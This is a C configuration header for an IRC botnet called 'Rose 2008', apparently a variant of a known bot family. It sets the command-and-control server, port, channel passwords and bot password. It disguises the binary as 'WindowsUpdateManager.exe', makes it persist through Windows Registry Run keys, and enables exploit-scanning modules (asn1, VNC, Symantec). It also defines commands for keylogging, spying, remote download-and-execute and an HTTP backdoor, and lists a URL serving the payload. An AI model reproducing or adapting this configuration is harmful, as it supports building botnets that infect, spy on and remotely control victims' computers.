/* 
#############################################
#                                           #
# Rose 2008 QuickFix.                       #
# So Far:                                   #
# Removed SYN                               #
# Removed DCOM                              #
# Removed LSASS                             #
# Added VNC                                 #
# Added SCANALL                             #
# Added SYM                                 #
# Removed TASKHIDER                         #
# WORK IN PROGRESS...                       #
# IRC.BLUEHELL.ORG - IRC.BLUEHELL.ORG       #
# #x0 #x0 #x0 #x0 #x0 #x0 #x0 #x0 #x0       #
#                                           #
#############################################
*/

char version[] = "rose2008";
char botid[] = "rose2008";
char filename[] = "WindowsUpdateManager.exe";
char valuename[] = "Windows Update Manager";
BOOL rndfilename = FALSE;
BOOL regrun = TRUE;
char prefix = '.';
int cryptkey = 0;
const int maxaliases = 16;
const int maxlogins = 1;
int maxrand = 2;

char nickconst[] = "x0r";
BOOL nickprefix = TRUE;
int nicktype = CONSTNICK;
char *authost[] = {"lol@r00ts-y0u.net", "\0"};
char bpass[] = "slaafjes";

// server information
char server[] = "raverz.p0rr.org";
char server2[] = "raverz.p0rr.org";
char serverpass[] = "";
int port = 8585;
int tftpport = 444; 
int socks4port = 7561;

//channel settings
char channel[] = "#rose2008";
char chanpass[] = "r00ted";
char exploitchan[] = "#rose2008-e";
BOOL topiccmd = TRUE;

SCANALL scanall[]={ 
{"asn1", true},  
{"vnc", true}, 
{"sym", true}, 
{NULL, false} 
}; 

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

//custom commands - IMMEDIATE CHANGE!
const char slogin[]="hey";
const char sremove[]="oprotte";
const char supdate[]="newupdate";
const char sdownload[]="newdownload";
const char sadvscan[]="asc";
const char sscanall[]="scanall";
const char sexecute[]="exec";
const char smirc[]="irc";
const char sspy[]="spy";
const char skeys[]="keys";
const char shttp[]="httpd";
const char scip[]="cip";
const char sprocs[]="ps";
const char svnchttp[]="hvnc";

#ifndef NO_VNC 
char http[] = "http://www.mctoni.us/files/WindowsUpdateManager.exe"; 
#endif

//httpd backdoor functions
int httpport = 81;
unsigned short bport = 4445;		// bindport for exploits
